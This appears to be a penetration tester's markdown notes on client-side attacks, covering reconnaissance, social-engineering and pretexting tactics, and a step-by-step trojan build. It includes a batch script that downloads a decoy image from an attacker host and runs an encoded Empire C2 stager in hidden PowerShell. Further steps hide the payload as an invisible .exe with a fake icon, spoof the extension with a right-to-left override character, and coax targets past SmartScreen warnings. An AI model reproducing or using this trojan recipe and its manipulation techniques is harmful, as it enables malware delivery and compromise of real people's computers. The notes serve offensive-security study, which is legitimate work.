# Client Side Attacks

Client-side attacks aim to exploit vulnerabilities or misconfigurations in client-side programs or to exploit the employees of companies to establish an initial foothold into an organizations networks.

These attacks are very effective and prevelent as humans are the weak link in an organizations security.

We are trying to get onto a client device in a network rather than attacking servers.

>[!IMPORTANT]
>The attacks we run will depend on the devices and software installed on the client machines

Due to the fact that client-side attacks usually need some kind of human interaction in order to work, social engineering comes into play when using them.

## Introductary Example

To get a better idea of how a client-side attack can work - consider the following fictitious but illustrative example.

We - the attackers - want to gain access to a company called Teszzla. We will use a client-side attack rather than a server attack to attempt to do this.

First, we research Teszzla using publicly available data. We look through their websites, social media and job postings. During this research we harvest names of employees and their roles in the company. We then gather data about the technology being used by Teszzla.

Next, we identify the best targets - employees - in Teszzla. We look for those who probably have access to the data we are after. We focus our recon on these employees and find out as much as we can about them using Open Source INTelligence methods.

After this, we develop our reources - maybe a trojan which uses a .png image or .pdf document tailored to our target. This will take into consideration what we know about the target *and* what we know about the technology being used by them.

We then establish the infrastructure we need in order to deliver the payload - maybe we clone a website, link it to a sneaky domain and start a file-sharing service along with a web server on the cloud.

Next, we work on creating a *pretext* for delivering the payload to the target - this might be a spear-phishing email to them which has a link to a malicious website which we have created. The malicious website may well be serving our trojans.

After this, we use social engineering techniques to deliver the payload and get the target to download a trojan.

Maybe the target downloads and opens the trojan. Malicious code will then execute on the *client* machine used by the target and call back to a *Command and Control* server which we have running on the cloud.

We have now gained access to the internal network of Teszzla via a client-side attack - notice how we had to hack a person as well as a computer.

The process of *post exploitation* begins.

### Client-Side Attack Methodology

Taking into consideration the example above - we can put together a high-level attack chain for a client-side attack - see it as a workflow :smiley:

- Reconnaissance
- Target Identification
- Resource Development
- Delivery
- Execution
- Post-Exploitation

## Client-Side Attack Vectors

Here are some common client-side attack vectors we can use to gain initial access to target networks.

### Social Engineering

The process of getting people to do things we want them to do which they wouldnt ordinarily do. We will go into these techniques in greater detail later - but as an overview social engineering includes:

- Phishing Emails
    - crafted emails to trick targets into clicking on malicious links or download malicious files
- Spear-Phishing Emails
    - phishing emails which are highly targeted due to extensive recon of the target
- Social Media Engineering
    - fake profiles used to establish connections and trust with targets and then get them to click on malicious links or downloads
- Pretexting
    - establishing a narrative to use to deceive the target
- Baiting
    - enticing the target to click on a malicious link or download malicious files
- Tailgating
    - establishing a relationship with the target and then using it to physically gain access to an organizations premises and therefore internal network

### Malicious Files

These can be any kind of file - .png .pdf. .docx etc - which have malicious content designed to execute once the file has been opened.

### Drive-By Downloads

We poison a compromised website or we create a website which contains malicious content - this is crafted so it is automatically downloaded and executed when a target visits the website.

### Watering Hole Attacks

Injecting malicious code to websites which we know are visited by the target.

### USB Attacks

We leave a poisoned USB stick somewhere a target will find it - the hope is they will be curious and mount it on a company machine. The stick will be infected with malware which automatically executes once the device has been mounted.

### Exploit Kits

These are kits such as BEEF which exploit client-side software - they make our life easier as attackers.

## Information Gathering

As always, the data we gather in this stage of the attack chain is of vital importance to the whole operation.

When it comes to recon for client-side attacks, we need to gather data about human targets as well as the software they are using and its configuration.

>[!IMPORTANT]
>Just knowing about the target - email address, interests etc - is not enough - we must know about the technology stack they are using, too

### Passive Techniques

We can use *passive* techniques to gather data about targets and the technology which is being used by an organization. These techniques include the following:

- Google Dorks
- Maltego
- The Harvester

### Active Techniques

We can use *active* techniques to gather data. These techniques include:

- Client Fingerprinting
- Social Engineering

#### Client Fingerprinting

Since data regarding client machines is not publicly available, we need to use an *active* information gathering technique such as *client fingerprinting* in order to obtain it.

A common way of fingerprinting a client machine is to use a phishing email to socailly engineer a target employee in an organization to visit a malicious webpage which contains code which will extract data regarding the client machines browser, plugins, extensions and operating system.

A good exploit kit to achieve this is BEEF - there are notes on how to use this framework as my repo on [hacking using the cloud | beef](https://github.com/puzz00/hacking-using-the-cloud/blob/main/hacking-using-the-cloud.md#hacking-web-browsers)

The `Details` tab of a hooked browser provides lots of useful data - it essentialy fingerprints the browser and even gives us the OS being used.

## Social Engineering

Social engineering is quite simply the art of getting people to do things we want them to do which they wouldnt normally do.

It is a vast field and it is as old as the hills. We find social engineering being used in just about every crime we can think of - from con men getting their victims to send them money to serial killers getting people to enter their cars.

Some white hat penetration testers find studying this area uncomfortable - seeing it as being unethical. It is - however - widely used by threat actors from teenage hackers - with or without autism - to nation state sponsored Advanced Persistent Threat groups - it is therefore vitally important to learn how to do it so we can better protect our clients.

>[!IMPORTANT]
>If we find it cynical or feel manipulative when performing social enginnering attacks against employees of companies we are working for - we need to remember that we have been tasked to find security vulnerabilities so as to *help* the employees - better we find that the company needs to invest more in staff anti-phishing training than they fall prey to a real attacker

### Social Engineering Basics

In these notes we are focusing on social engineering in the context of attempting to gain access to a network so we can further our attack on the target organization.

We are aiming to find ways to manipulate people so they help us realize our goals. We will be seeking to use psychology in different ways to exploit human emotions and desires to get employees to act in a way which compromises the security of their employer. These actions may well seem small and inconsequential - an employee letting us know whether they use windows or a mac for example.

The human mind is complex and there are many ways we can seek to hack it. Here are some common human tendencies which are exploited during a social engineering campaign:

- Wanting to be helpful
- Trust
- Needing approval or to be liked
- Fear
- Wanting to avoid conflict

It is worth considering the power of social engineering - instead of spending hours messing about with server side attacks we can gain access to a network within minutes via a well carried out hack of an employee - this is one of the reasons it is so popular with threat actors.

>[!NOTE]
>With the rise of social media - social engineering has *massively* risen in importance and effectiveness - looking at profiles is well worth taking the time to do

### Pretexting

Pretexting is important - we are establishing a relationship based on trust with a target.

When we create a pretext we are trying to make things seem as normal as possible for the target. This can take time - we are creating a relationship with the target. This relationship will be based on a false pretext - we will be pretending to be somebody we are not such as a colleague or a member of a service provider - there are many more examples.

>[!TIP]
>This one is from Sun Zi - engage people with what they expect | it is what they are able to discern and confirms their projections | it settles them into predictable patterns of response | occupying their minds while we wait for the extraordinary moment | that which they cannot anticipate

The point is that people are more likely to trust people they feel as though they know and are comfortable with - they are less likely to act as we want them to if our messages or requests come out of nowhere - our requests need to come out of the pretext.

>[!NOTE]
>Creating a good pretext narrative comes from quality reconaissance - we need to get to know how the organization typically works - which departments do they have - what is their general company ethos or way of doing things etc

#### Pretexting Defining Characteristics

Here we will look at some general characteristics which make up a pretexting campaign.

##### False Pretense

False pretense simply means that we get the target to believe we are who we say we are. Our aim is to get the target to trust their interaction with us. This includes techniques such as making sure our emails look legitimate or professional and do not end up in the spam folder. We are creating our made up story by pretending to be somebody who has a real and innocent need to ask for information.

##### Trust Establishment

Through the pretext we foster our relationship with the target and seek to gain their trust.

During this phase we will be thinking psychology - how can we get the target to connect with us - maybe by showing a shared interest with them or reflecting their tone and use of language in email correspondence.

These are just *electronic forms* of physical techniques we can use to build a rapport with somebody. For example - when sitting and talking with people who may at first be unwilling to share much with us - we can generally exploit techniques such as subtly mirroring their body language and repeating words they have said and changing our phrasing and tone of voice to match theirs to make them feel more relaxed and to establish a connection with them - this in turn will lead to the person sharing more with us - perhaps more than they would have originally intended.

##### Manipulation of Emotions

In this phase we seek to exploit the emotions of the target. Which emotion or emotions and how is very specific to what we have ascertained about the person.

Generally speaking we can focus on areas such as inquisitiveness | sympathy | needing approval | fear | greed and urgency.

>[!IMPORTANT]
>The manipulation of emotions needs to be done in a subtle way from the pretext and relationship we have already created

A target is *much* more likely to click on a link which they are curious about from a contact they feel comfortable with than on a link in a random email which drops out of nowhere and is riddled with spelling mistakes and dodgy grammar. Hey - who knew - it turns out my long lost uncle is really a prince who needs to get a load of money out of :nigeria: INSERT COUNTRY NAME HERE :nigeria: - great - I get to keep 33% of it if I let him transfer it into my bank account :grin:

##### Data Extraction

Data extraction must be done after the pretext and trust have been established. The data extraction works hand-in-hand with the manipulation of emotions - we might for example prey on an employees fear of messing something important up or their desire to be helpful and win approval.

##### Consistency

We must work hard at maintaining consistency in our interactions with targets. We want our pretext to remain plausible - ideally the target wont even know they have been manipulated.

This will require us to undertake thorough reconaissance of targets and the organizations they work for. We will need to be flexible and able to quickly adapt our responses and techniques according to the behaviour of the target.

#### Pretexting Email Templates

For some examples of email templates which can be adapted and used as pretexts in phishing campaigns - please see [phishing pretexts](https://github.com/L4bF0x/PhishingPretexts)

## Resource Development

In this section we will be looking at how we can craft malicious resources to use against our targets.

### Developing Trojan Horses

We all know the story of the original Trojan Horse from Greek mythology. In cyber security a trojan is simply a malicious piece of code - for example a meterpreter reverse shell, empire stager, keylogger, custom reverse shell - which runs in the background behind an innocent file such as a .png .pdf or .exe

The idea is that the target will see the innocent side but not the malicious one - no sweaty Greek men need to be involved :relieved: 

Essentially a trojan needs to look and act like a normal file but at the same time execute malicious code in the background.

>[!NOTE]
>There are lots of ways to develop and deliver trojans - we will cover some of them which will hopefully be of use :smiley: 

#### Using Powershell in a Batch Script

The idea is simple - we will create a .bat script which will use powershell to download and execute an innocent file and then execute malicious code.

Once we have this working we will polish the look of the trojan to make it as believable as possible. Social engineering will greatly assist in getting the target to open the trojan but there are some tricks we can use to make it more likely that they will fall for it.

##### Serving Necessary Files

In order for this method to work the trojan will need to be able to download the necessary files from somewhere. We can serve these ourselves using an opensource file sharing service called [pwndrop](https://github.com/kgretzky/pwndrop)

>[!NOTE]
>We can use a cloud server to host pwndrop but in these notes we are working on a local area network

After we have cloned the pwndrop repo and navigated into it we can use `make` to prepare it for installation. We can then use `make install` to install it.

>[!IMPORTANT]
>We need to have go installed on our system for the installation of pwndrop to work - we can get this on kali using `sudo apt install golang-go`

Once we have installed pwndrop it will be running. We can stop, start and check its status using `service` commands such as `sudo service pwndrop stop` or we can use `/usr/local/pwndrop/pwndrop/stop`

We can now access the login panel of pwndrop via a web browser. Since we are working on a LAN we can just use the IP address of the server or `localhost` but if we have installed pwndrop on a cloud server which has a domain name associated with it we can use the domain name.

The admin panel is found at `http://localhost/pwndrop/` - we will need to change `localhost` to a domain name if working with it on the cloud and a domain we have purchased.

>[!TIP]
>The path to the admin panel can be changed in the settings once we have logged into pwndrop

When we first log into pwndrop we will need to create a username:password which we can use for subsequent access to it.

It is very easy to use and is mostly self explanatory.

One thing to notice is how pwndrop by default adds gibberish into the path of uploaded files. I find this makes urls less believable and therefore like to delete it - this can be done in the settings for each individual file.

![pwndrop1](/images/3.png)

In this example we are creating a trojan for a target who is interested in astrophotography. The .png is therefore related to this interest.

We will be using a simple empire stager as the malicious payload.

![empire1](/images/1.png)

![empire2](/images/2.png)

With our pwndrop server now serving we can access the .png file we need for the frontend of our trojan.

![pwndrop2](/images/4.png)

##### Creating the Batch Script

The .bat script we create will first of all use `cd %TEMP%` to navigate into the `Temp` directory. This is so the target will not see suspicious files appearing on their file system - most people never navigate to it.

It will then use powershell to download the innocent .png file we are serving. Since this powershell command will be executed from within a batch script we will need to explicitly state we want to use powershell: `Powershell -Command "Invoke-WebRequest 'http://192.168.56.101/witch-head.png' -OutFile 'witch-head.png'"`

We will then open the .png file so the target believes they have just opened it in a normal way even though they have not. We can open it by simply using `witch-head.png`

Next we will execute the malicious code which in this case is the base64 encoded empire multi stager.

![trojan1](/images/5.png)

The following code is the complete batch script as run in this example:

```
cd %TEMP%
Powershell -Command "Invoke-WebRequest 'http://192.168.56.101/witch-head.png' -OutFile 'witch-head.png'"
witch-head.png
powershell -nop -sta -w 1 -enc SQB<SNIP>AFM
```

Once we have crafted our malicious batch script and saved it as a .bat file we can try executing it.

![trojan3](/images/7.png)

![trojan4](/images/8.png)

At this point we have a working trojan - okay - not many if any people are going to open that dodgy looking batch file - though with good social engineering some will - so we will next work on making it look more legitimate.

##### Converting .bat to .exe and Adding an Icon

At this point we have a trojan which works but looks suspicious.

![trojan6](/images/6.png)

We want to make it look more like a .png as in this example we are using a .png file as the cover for the malicious code.

We can turn the .bat script into an .exe file using a .bat to .exe [conversion tool](https://github.com/tokyoneon/B2E)

This is a good tool because we can add an .ico to make the file look more like a .png and we can choose to make `Exe-Format` option `(Invisible)` which means the target will not see the script run.

>[!TIP]
>We can easily create an .ico file using an online .png to .ico conversion tool - there are lots of them

![trojan7](/images/9.png)

Once we have finished converting the .bat file to an .exe file as described above the trojan will look more believable.

![trojan8](/images/10.png)

>[!NOTE]
>Windows by default does not show file extensions so we do not at this point need to worry about .exe showing and scaring the target - there is a trick we can use to help with this which will soon see

If we open the trojan now we find that no warnings pop up and no scary scripts can be seen running - we just see what the target would expect to see - a .png image of the witch-head nebula.

![trojan9](/images/11.png)

The malicious code has still been executed in the background and we find a new agent has checked into our empire C2 server.

![trojan10](/images/12.png)

This means our trojan is more likely to be executed by the target.

The next question relates to delivery methods. If we have managed to get the trojan to the target in a way which does not use the internet - for example on a USB stick - then the trojan will work as we have seen.

In most cases though we will be delivering the trojan using the internet in some way or form. This raises the problem of the browser showing the real file extension of .exe when the trojan is being downloaded and Defender SmartScreen warning the target that they are opening an executable. We will look at some ways we can mitigate these problems next.

##### Dealing with the .exe Extension and Pesky Defender SmartScreen

When we upload our trojan to pwndrop we see that it has an .exe file extension after our .png fake one.

![trojan11](/images/13.png)

If the target downloads this as it is they will be able to see the .exe file extension since the browswer will display it on the file name.

We can get around this by creating a zip archive of several files. In this example we zip three pictures of astrophotography. Since this is Proof Of Concept we only make one of them a trojan. In reality we would make them all trojans.

![trojan12](/images/14.png)

![trojan13](/images/15.png)

![trojan14](/images/16.png)

The next problem is Defender SmartScreen giving the target a warning not to open the file which has been downloaded because it is an unrecognised app.

We can use social engineering techniques to get around this.

![trojan15](/images/17.png)

![trojan16](/images/18.png)

Another problem this causes is that the scary .exe file extension has reared its ugly head again. Fortunately we can use a trick to hide it.

We will use the *right-to-left override* character which can be found online in different places - one such place can be found [here](https://unicode-explorer.com/c/202E)

The idea is simple - we will think of a word which ends exe or nearly ends exe - in this case we use annexe hoping the target doesnt think too much of it - maybe an annexe of photos!

We then craft a file name such as `astro-backyard-1-anngnp.exe`

The `gnp.exe` part will have the right-to-left override character applied to it so it will read as `exe.png` which will make the whole sneaky filename read as `astro-backyard-1-annexe.png`

![trojan17](/images/19.png)

![trojan18](/images/20.png)

![trojan19](/images/21.png)

![trojan20](/images/22.png)

The target will still be warned when they open the trojan but the scary .exe file extension is no longer visible - it looks like a legit .png because SmartScreen doesnt pick up on the fact that the RLO character has been used.

In our social engineering we can play on the fact that the .png is from an unknown publisher and this is why Defender gives a warning. There are other techniques we can use too - these are to be covered in the social engineering section of these notes :smiling_imp: 

![trojan21](/images/23.png)

>[!TIP]
>We dont have to use a word which ends exactly exe - we can just add an e to words which end ex - targets will tend to see this as a typo - especially if they are very keen to open the image - why does `sexe` spring to mind? We could also register a domain name such as `galexe` and use it in our file names